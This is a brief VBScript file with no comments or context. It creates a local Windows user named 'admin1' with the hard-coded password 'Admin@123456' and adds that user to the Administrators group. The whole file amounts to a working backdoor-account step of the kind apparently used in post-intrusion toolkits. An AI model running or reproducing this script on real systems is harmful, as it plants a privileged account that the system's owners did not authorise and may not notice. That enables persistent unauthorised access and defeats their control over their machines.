set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os)
Set oe=GetObject(os&"/Administrators,group")
Set od=ob.Create("user","admin1")
od.SetPassword "Admin@123456"
od.SetInfo
Set of=GetObject(os&"/admin1",user)
oe.add os&"/admin1"
